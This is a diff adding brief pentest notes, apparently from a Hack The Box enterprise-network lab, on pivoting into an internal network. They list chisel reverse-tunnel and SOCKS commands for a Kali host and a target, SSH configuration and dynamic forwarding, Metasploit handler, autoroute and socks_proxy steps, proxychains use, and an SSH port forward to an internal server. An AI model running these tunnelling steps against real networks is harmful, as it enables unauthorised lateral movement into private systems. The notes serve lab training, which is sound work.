@@ -1,0 +1,32 @@
+In kali linux
+
+    env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
+
+    ./chisel server -p 8080 --socks5
+    sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+    sudo systemctl start ssh.service
+    ssh -N -D 0.0.0.0:1080 localhost
+
+On target
+    chisel.exe client 192.168.0.0:8080 socks
+
+MSF 
+    msf6 exploit(multi/handler) > exploit
+
+    use multi/manage/autoroute
+    set session 3
+    exploit
+
+    use auxiliary/server/socks_proxy
+    set srvhost 127.0.0.1
+    exploit -j
+
+
+On kali linux
+    sudo proxychains ping 172.16.0.0
+
+https://forum.hackthebox.com/t/attacking-enterprise-networks-double-pivot-using-chisel/267043/4
+
+
+
+ssh -i id_rsa -L 2222:appserver05.dev.final.com:22 -N "final\tommy@172.16.178.184"
